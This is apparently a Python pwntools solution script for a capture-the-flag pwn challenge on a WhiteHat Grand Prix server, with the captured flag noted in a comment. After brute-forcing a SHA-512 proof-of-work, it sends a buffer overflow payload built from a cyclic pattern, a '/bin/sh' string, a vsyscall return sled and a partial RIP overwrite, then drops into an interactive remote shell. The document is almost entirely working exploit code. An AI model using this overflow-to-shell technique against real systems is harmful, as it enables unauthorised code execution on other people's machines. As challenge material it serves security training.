import hashlib
import os
import time

# flag: WhiteHat{6c6edbd044176a913a1ed34661a37e836848f066}

def solve(pre, sice):
    for i in range(0x100000):
        if hashlib.sha512( pre + str(i)).hexdigest().startswith(sice):
            return i
    return -1

from pwn import *

proc = remote("pwn03.grandprix.whitehatvn.com", 2023)

proc.recvuntil("sha512(\"")
pre = proc.recvuntil('"').strip('"')
proc.recvuntil("0x")
pow_chall = proc.recvuntil("...").strip("...").strip("0x")
solution = solve(pre, pow_chall)
proc.recvuntil(" =")
proc.sendline(str(solution) + "\x00" + "A"*(77-len(str(solution))-1))

proc.recvuntil("al?")
proc.send("N0")

proc.recvuntil("/sh")
proc.sendline("1")

# an address that exists: 0x7ffff7a05b97 an address we need 0x7ffff7a3343e
vsyscall = p64(0xffffffffff600400)
count = 30

send_flag = '/bin/sh\x00'

leftover = (232-143-len(send_flag))
proc.send(cyclic(143) +send_flag+ 'A'*leftover+vsyscall*count + '\x3a\x34\xa3') # RIP control :P
proc.interactive()
